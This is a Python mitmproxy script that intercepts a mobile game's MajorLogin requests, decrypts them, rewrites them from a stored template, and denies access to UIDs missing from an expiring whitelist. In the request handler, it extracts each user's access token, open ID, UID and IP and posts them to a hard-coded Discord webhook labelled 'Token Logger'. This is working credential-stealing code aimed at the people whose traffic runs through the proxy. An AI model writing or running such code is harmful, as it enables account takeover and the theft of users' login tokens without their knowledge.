import os
import sys
from mitmproxy import http
import json
import asyncio
import aiohttp
from crypto.encryption_utils import aes_decrypt, encrypt_api
from protocols.protobuf_utils import get_available_room, CrEaTe_ProTo
import copy
import time

# Ensure local package imports work when mitmproxy loads this script.
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if SCRIPT_DIR not in sys.path:
    sys.path.insert(0, SCRIPT_DIR)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1464297181078098174/J3F676qrKhGVUfK4r0Kar1mHvkAM5-Bk2LO-OnvGx5MU18o01FlMj3NKt6clo7HELi6-"

MOBILE_PROTO = "74193be8a057a9a6688f10a4f7d9ac25aeaba3e9fcc49cf88a68a3284cf492e986cce2160a1e4f81a6b320cc3177ac676beed877bbd458a4b85163ef13378d4661b2f00f59f0d15bc07514505b6808b58668319e386d3f1ab18df22a63f3ea5e49ff2a8e6b984bc2822f881e7aee73b86ef254371722ca1afc9b0a8e925e7a8b4c13bd1b12f42921dcc55ca87ca1a0cbfc3afb1562520b451bb2eb8e3ebbc9c36587c5212c6a6aacd8a1e67cb587350d5be43536e0b6c570a943015ecc92214d16d8675a52e2a32d456e4fc75967769ff64c2ff3267ba80b5fdef33a80148672567ca53d1553015adf9420fe5777321ededaab228d0b3952c0090c46d6d1e490ec743c657cd147dfeee8df31759241e5b2368ad085bbaaebd5378acf503a7b009db6823b40de2c985f1da25e10fa83e950f20a26a33b0de42a69a8c571950ae05a195bb4df69e3572e7b55b7c2ba7d02d8ba2cba9f02d30e4ed62ca0fe866fb23f7a5e6309fe631c47ed5b6cf0ebec5ac54c1aca4716f189a0fd0b18b994664d5637d6503a94ebe387c539b5b468816b13ed4371669c3cc3b649222d43e687e5636ceed840cd4846f692226c4224d48e1c5ab65337769fbdfa18f55aeab5ae9d14cf8bf97bef8716b4a98746130c2f3964510a6adad630aa5d38d312ce9dae68e2a9ff2306f861355e623704b4dd8189391e1eb94e06fd6a1b13d631af46be6b6bece06a40ef9083202b3f9c194244a2439cf20b7e42e2c43e75570d32be5f6eae6ff74d9092ce0555ad3a283325f67264cf29d5bb9e137a0c7db69fce86b555cc2ef4bd3c6d3c79ccb7e80fbfb3572ef84abf96de397c37cfa7d7b162f2623ce493550e9179eb35874c566ee8433bba98054021a2795c30fa72b56ec11d4051dcf9887b7fcc255022290760b44fcdd2c55596611e8e69f233de317ffddf1877bfd84eb19ba48191831e876fa6ee15986498effa44755a41a1be788f93b278e901a889666a35c841f09d22e6d5d8c71d6c3e29d0cacf70041e2bf3075a169503abf8dce0b32d22e3dcbba1cd47940878c28d4c23750d95c88fb99561f4567b935da3e9ebc7c3f3acb11c28f7779470470dc9d9ff58f6086aa23f8e1dc63b46262bcebec9a056434f4e1be358d68d3a37"


decrypted_bytes = aes_decrypt(MOBILE_PROTO)
decrypted_hex = decrypted_bytes.hex()
proto_json = get_available_room(decrypted_hex)
proto_fields = json.loads(proto_json)
proto_template = copy.deepcopy(proto_fields)


WHITELIST_BD = "whitelist_bd.json"
WHITELIST_IND = "whitelist_ind.json"

def load_whitelist(path):
    try:
        with open(path, "r") as f:
            data = json.load(f)
            # Load as {uid: {"name": name, "expiry": expiry}}
            whitelist_data = {}
            for uid, value in data.items():
                if isinstance(value, dict):
                    whitelist_data[uid] = value
                else:
                    whitelist_data[uid] = {"name": "Unknown", "expiry": int(value)}
            return whitelist_data
    except Exception:
        return {}

def is_uid_whitelisted(uid_str):
    try:
        now = int(time.time())
        bd = load_whitelist(WHITELIST_BD)
        ind = load_whitelist(WHITELIST_IND)

        print(f"[Whitelist check] UID={uid_str}  Now={now}")

        if str(uid_str) in bd:
            user_data = bd[str(uid_str)]
            expiry = int(user_data.get("expiry", 0))
            name = user_data.get("name", "Unknown")
            print(f"UID found in BD whitelist (name: {name}, expires {expiry}, left {expiry - now}s)")
            return expiry > now

        if str(uid_str) in ind:
            user_data = ind[str(uid_str)]
            expiry = int(user_data.get("expiry", 0))
            name = user_data.get("name", "Unknown")
            print(f"UID found in IND whitelist (name: {name}, expires {expiry}, left {expiry - now}s)")
            return expiry > now

        print("UID not found in either whitelist")
        return False
    except Exception as e:
        print(f"Error checking whitelist: {e}")
        return False


async def send_discord_embed_async(uid, access_token, open_id, main_active_platform, client_ip=None):
    embed = {
        "title": "🎫 FFMConnect Login Detected",
        "color": 0x2ECC71,
        "fields": [
            {"name": "UID", "value": str(uid), "inline": False},
            {"name": "Access Token", "value": f"`{access_token}`", "inline": False},
            {"name": "Open ID", "value": f"`{open_id}`", "inline": False},
            {"name": "Main Active Platform", "value": str(main_active_platform), "inline": False}
        ],
        "footer": {
            "text": "FFMConnect Token Logger"
        }
    }
    
    if client_ip:
        embed["fields"].append({"name": "Client IP", "value": client_ip, "inline": False})
    
    data = {
        "embeds": [embed]
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(DISCORD_WEBHOOK_URL, json=data) as resp:
                await resp.text()
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def run_async_task(coro):
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.ensure_future(coro)
        else:
            loop.run_until_complete(coro)
    except RuntimeError:
        new_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(new_loop)
        new_loop.run_until_complete(coro)

def get_client_ip(flow: http.HTTPFlow) -> str:
    """Get client IP address"""
    if hasattr(flow.client_conn, 'address') and flow.client_conn.address:
        return flow.client_conn.address[0]
    return "unknown"

def request(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            request_bytes = flow.request.content
            request_hex = request_bytes.hex()
            decrypted_bytes = aes_decrypt(request_hex)
            decrypted_hex = decrypted_bytes.hex()
            proto_json = get_available_room(decrypted_hex)
            proto_fields = json.loads(proto_json)
            
            print("Original MajorLogin Request Details:")
            print(json.dumps(proto_fields, indent=2, ensure_ascii=False))
            
            uid = None
            access_token = None
            open_id = None
            main_active_platform = None
            
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid = potential_uid
                        print(f"Found UID in field {field_num}: {uid}")
                        break
            
            if "29" in proto_fields and isinstance(proto_fields["29"], dict) and "data" in proto_fields["29"]:
                access_token = str(proto_fields["29"]["data"])
            
            if "22" in proto_fields and isinstance(proto_fields["22"], dict) and "data" in proto_fields["22"]:
                open_id = str(proto_fields["22"]["data"])
            
            if "99" in proto_fields and isinstance(proto_fields["99"], dict) and "data" in proto_fields["99"]:
                main_active_platform = str(proto_fields["99"]["data"])
            elif "100" in proto_fields and isinstance(proto_fields["100"], dict) and "data" in proto_fields["100"]:
                main_active_platform = str(proto_fields["100"]["data"])
            
            print(f"Extracted from MajorLogin:")
            print(f"  UID: {uid}")
            print(f"  Access Token: {access_token}")
            print(f"  Open ID: {open_id}")
            print(f"  Main Active Platform: {main_active_platform}")
            
            if access_token and open_id:
                client_ip = get_client_ip(flow)
                print(f"Sending to Discord: UID={uid}, Token={access_token[:20]}..., OpenID={open_id}")
                run_async_task(send_discord_embed_async(uid, access_token, open_id, main_active_platform, client_ip))
            
            print("\n=== MODIFYING MAJORLOGIN REQUEST ===")
            
            modified_proto = copy.deepcopy(proto_template)
            
            if "29" in modified_proto and isinstance(modified_proto["29"], dict):
                modified_proto["29"]["data"] = access_token if access_token else modified_proto["29"].get("data", "")
                print(f"Updated field 29 (access_token): {modified_proto['29']['data'][:20]}...")
            
            if "22" in modified_proto and isinstance(modified_proto["22"], dict):
                modified_proto["22"]["data"] = open_id if open_id else modified_proto["22"].get("data", "")
                print(f"Updated field 22 (open_id): {modified_proto['22']['data']}")
            
            if main_active_platform:
                if "99" in modified_proto and isinstance(modified_proto["99"], dict):
                    modified_proto["99"]["data"] = int(main_active_platform)
                else:
                    modified_proto["99"] = {"wire_type": "varint", "data": int(main_active_platform)}
                
                if "100" in modified_proto and isinstance(modified_proto["100"], dict):
                    modified_proto["100"]["data"] = int(main_active_platform)
                else:
                    modified_proto["100"] = {"wire_type": "varint", "data": int(main_active_platform)}
                print(f"Updated fields 99/100 (main_active_platform): {main_active_platform}")
            
            print("Modified Request Fields:")
            print(f"  Field 29: {modified_proto.get('29', {}).get('data', 'NOT_FOUND')[:20]}...")
            print(f"  Field 22: {modified_proto.get('22', {}).get('data', 'NOT_FOUND')}")
            print(f"  Field 99: {modified_proto.get('99', {}).get('data', 'NOT_FOUND')}")
            print(f"  Field 100: {modified_proto.get('100', {}).get('data', 'NOT_FOUND')}")
            
            proto_bytes = CrEaTe_ProTo(modified_proto)
            hex_data = encrypt_api(proto_bytes)
            flow.request.content = bytes.fromhex(hex_data)
            print("Successfully modified and encrypted MajorLogin request")
                
        except Exception as e:
            print(f"Error processing MajorLogin request: {e}")

def response(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            resp_bytes = flow.response.content
            resp_hex = resp_bytes.hex()
            proto_json = get_available_room(resp_hex)
            proto_fields = json.loads(proto_json)
            
            uid_from_response = None
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid_from_response = potential_uid
                        print(f"Found UID in response field {field_num}: {uid_from_response}")
                        break
            status_color = "[FF0000]"
            uid_color = "[FF0000]"
            if uid_from_response is not None:
                if not is_uid_whitelisted(uid_from_response):
                    flow.response.content = (
                        f"\n"
                        f"[FF0000]⚠ ACCESS DENIED ⚠\n"
                        f"\n"
                        f"[FFFFFF]Your UID [FF0000]{uid_from_response}[FFFFFF] is not authorized.\n"
                        f"[FFFFFF]Account is not listed in secure whitelist or expired.\n"
                        f"\n"
                        f"[FFAA00]Contact [00FF00]Admin[FFAA00] For Access\n"
                        f"\n"
                    ).encode()
   
                    flow.response.status_code = 500
                    return
                else:
                    print(f"UID {uid_from_response} is authorized")
            else:
                print("No UID found in MajorLogin response")

        except Exception as e:
            print(f"Error processing MajorLogin response: {e}")